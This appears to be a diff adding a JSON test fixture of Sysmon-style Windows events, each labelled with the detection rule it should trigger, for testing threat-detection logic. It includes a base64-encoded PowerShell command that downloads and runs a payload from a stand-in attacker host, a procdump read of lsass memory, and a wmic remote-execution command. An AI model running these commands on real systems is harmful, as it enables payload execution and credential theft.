@@ -1,0 +1,80 @@
+[
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -NoProfile -NonInteractive -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBhAHQAdABhAGMAawBlAHIALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\jsmith",
+    "ComputerName": "WORKSTATION-042",
+    "timestamp": "2024-03-15T14:23:01Z",
+    "expected_detection": "office_spawns_powershell AND ps_encoded_command"
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -ExecutionPolicy RemoteSigned -File C:\\Scripts\\backup.ps1",
+    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "ComputerName": "SERVER-001",
+    "timestamp": "2024-03-15T02:00:00Z",
+    "expected_detection": "None (legitimate scheduled task)"
+  },
+  {
+    "EventID": 10,
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "SourceImage": "C:\\Users\\jsmith\\Downloads\\procdump.exe",
+    "GrantedAccess": "0x1fffff",
+    "User": "CORP\\jsmith",
+    "ComputerName": "WORKSTATION-042",
+    "timestamp": "2024-03-15T14:25:33Z",
+    "expected_detection": "lsass_memory_access"
+  },
+  {
+    "EventID": 10,
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "SourceImage": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
+    "GrantedAccess": "0x1410",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "ComputerName": "SERVER-001",
+    "timestamp": "2024-03-15T03:15:00Z",
+    "expected_detection": "None (filtered - Windows Defender)"
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c whoami",
+    "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+    "User": "CORP\\admin",
+    "ComputerName": "SERVER-DB-01",
+    "timestamp": "2024-03-15T22:44:11Z",
+    "expected_detection": "wmi_remote_execution"
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\WMIC.exe",
+    "CommandLine": "wmic.exe /node:192.168.10.50 process call create \"cmd.exe /c whoami\"",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\admin",
+    "ComputerName": "WORKSTATION-007",
+    "timestamp": "2024-03-15T23:01:45Z",
+    "expected_detection": "wmi_remote_execution (wmic /node: variant)"
+  },
+  {
+    "EventID": 11,
+    "TargetFilename": "C:\\ProgramData\\Microsoft\\Crypto\\audit_backup.zip",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "User": "CORP\\jsmith",
+    "ComputerName": "WORKSTATION-042",
+    "timestamp": "2024-03-15T14:30:22Z",
+    "expected_detection": "data_staging"
+  },
+  {
+    "EventID": 11,
+    "TargetFilename": "C:\\Windows\\Temp\\compress_cache.7z",
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "ComputerName": "SERVER-001",
+    "timestamp": "2024-03-15T04:10:00Z",
+    "expected_detection": "None (filtered - svchost from system32)"
+  }
+]
